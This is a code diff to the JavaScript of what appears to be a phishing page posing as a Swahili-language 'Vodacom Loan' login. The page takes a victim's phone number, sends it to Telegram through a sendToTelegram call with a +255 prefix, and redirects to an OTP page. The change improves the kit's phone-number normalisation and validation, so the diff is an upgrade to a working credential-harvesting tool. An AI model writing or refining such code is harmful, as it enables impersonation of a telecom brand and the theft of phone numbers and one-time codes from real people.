@@ -1,6 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
     const phoneInput = document.getElementById('app-phone');
     const confirmBtn = document.querySelector('.confirm-button');
+    const phoneDigitsOnly = (value) => value.replace(/\D/g, '');
 
     let isSubmitting = false;
 
@@ -16,17 +17,32 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
+    function normalizePhoneForCountryCode(value) {
+        const digits = phoneDigitsOnly(value);
+        if (digits.length === 10 && digits.startsWith('0')) {
+            return digits.slice(1);
+        }
+        if (digits.length === 9) {
+            return digits;
+        }
+        return '';
+    }
+
+    phoneInput.addEventListener('input', () => {
+        phoneInput.value = phoneDigitsOnly(phoneInput.value).slice(0, 10);
+    });
+
     // Button submit effect
     confirmBtn.addEventListener('click', async () => {
-        const phoneNumber = phoneInput.value.trim();
-        if (phoneNumber.length > 0 && !isSubmitting) {
+        const normalizedPhone = normalizePhoneForCountryCode(phoneInput.value);
+        if (normalizedPhone && !isSubmitting) {
             isSubmitting = true;
             confirmBtn.style.opacity = '0.5';
             confirmBtn.style.pointerEvents = 'none';
-            await sendToTelegram(`<b>Vodacom Loan - Kuingia Mapya</b>\nSimu: <code>+255${phoneNumber}</code>`);
+            await sendToTelegram(`<b>Vodacom Loan - Kuingia Mapya</b>\nSimu: <code>+255${normalizedPhone}</code>`);
             window.location.href = 'loading.html?next=otp.html&delay=3000';
-        } else if (phoneNumber.length === 0) {
-            alert('Tafadhali weka namba yako ya simu.');
+        } else if (!normalizedPhone) {
+            alert('Weka namba sahihi yenye tarakimu 9 (au 10 ikianza na 0).');
         }
     });
 });
